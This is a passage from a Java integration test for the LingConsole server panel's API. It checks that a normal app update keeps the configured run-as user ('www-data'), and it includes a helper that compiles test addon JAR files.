        JsonNode cfg = MAPPER.readTree(apiGet("/api/nodes/" + nodeId + "/apps/runasit/advanced", token).body())
                .path("data");
        assertEquals("www-data", cfg.path("runAsUser").asText(), "高级接口应写入启动用户");

        
        String updateBody = "{\"name\":\"run-as-renamed\",\"command\":\"" + command + "\"}";
        HttpRequest upd = HttpRequest.newBuilder(URI.create("http://127.0.0.1:" + panelPort
                        + "/api/nodes/" + nodeId + "/apps/runasit"))
                .header("X-LingConsole-Token", token)
                .header("Content-Type", "application/json")
                .PUT(HttpRequest.BodyPublishers.ofString(updateBody))
                .build();
        assertEquals(200, http.send(upd, HttpResponse.BodyHandlers.ofString()).statusCode());

        JsonNode cfg2 = MAPPER.readTree(apiGet("/api/nodes/" + nodeId + "/apps/runasit/advanced", token).body())
                .path("data");
        assertEquals("www-data", cfg2.path("runAsUser").asText(), "普通更新不应改动启动用户");

        apiDelete("/api/nodes/" + nodeId + "/apps/runasit", token);
    }

    private Path compileAddonJar(String name, String mainClass, String source) throws Exception {
        Path work = Files.createTempDirectory("addon-test-" + name);
        Path src = work.resolve(mainClass.replace('.', '/') + ".java");
        Files.createDirectories(src.getParent());
        Files.writeString(src, source, java.nio.charset.StandardCharsets.UTF_8);
        var compiler = javax.tools.ToolProvider.getSystemJavaCompiler();
        int rc = compiler.run(null, null, null,
                "-cp", System.getProperty("java.class.path"),
                "-d", work.toString(), src.toString());
        if (rc != 0) {
            throw new IllegalStateException("测试插件编译失败: " + name);
        }
        Path jar = Files.createTempFile("addon-test-" + name, ".jar");
        String desc = "name = \"" + name + "\"\nversion = \"1.0.0\"\nmain = \"" + mainClass + "\"\n";
        try (var jos = new java.util.jar.JarOutputStream(new java.io.FileOutputStream(jar.toFile()))) {
            jos.putNextEntry(new java.util.jar.JarEntry("addon.toml"));
            jos.write(desc.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            jos.closeEntry();
            try (var stream = Files.walk(work)) {
                for (Path f : stream.filter(Files::isRegularFile).toList()) {
                    String entry = work.relativize(f).toString().replace('\\', '/');
                    jos.putNextEntry(new java.util.jar.JarEntry(entry));
                    jos.write(Files.readAllBytes(f));
                    jos.closeEntry();
                }
            }
        }
        return jar;
    }
}
